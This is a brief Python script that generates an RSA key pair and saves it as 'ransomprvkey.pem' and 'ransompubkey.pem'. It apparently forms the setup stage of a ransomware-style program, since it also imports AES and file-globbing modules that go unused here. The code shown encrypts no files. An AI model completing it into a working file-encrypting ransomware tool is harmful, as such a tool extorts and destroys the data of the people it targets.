from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from base64 import b64encode
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import glob
import os

"Generate Private Key"
cwd = os.getcwd()
os.chdir(cwd)
key = RSA.generate(2048)
private_key = key.export_key()
with open('ransomprvkey.pem','wb') as f:
    f.write(private_key)
    print(private_key)

"Generate Public Key"
public_key = key.publickey().export_key()
with open('ransompubkey.pem','wb') as f:
    f.write(public_key)
    print(public_key)

